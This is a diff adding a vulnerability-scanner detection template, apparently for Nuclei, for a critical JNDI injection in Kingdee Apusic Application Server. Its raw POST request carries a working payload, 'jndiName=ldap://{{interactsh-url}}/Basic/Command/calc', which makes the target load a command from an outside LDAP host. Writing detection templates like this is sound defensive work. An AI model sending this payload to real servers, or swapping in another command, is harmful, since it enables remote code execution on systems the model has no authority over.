@@ -1,0 +1,44 @@
+id: kingdee-apusic-jndi-injection
+
+info:
+  name: Kingdee Apusic Application Server JNDI Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects JNDI injection vulnerability in Kingdee Apusic Application Server via the `/appmonitor/protect/jndi/loadTree` endpoint.
+  tags: jndi, injection, ldap, critical
+
+http:
+  - raw:
+      - |
+        POST /appmonitor/protect/jndi/loadTree HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 55
+
+        jndiName=ldap://{{interactsh-url}}/Basic/Command/calc
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: body
+        regex:
+          - "calc.*"
+
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        regex:
+          - "jndiName=(ldap://[a-zA-Z0-9.-]+/[a-zA-Z0-9./]*)"
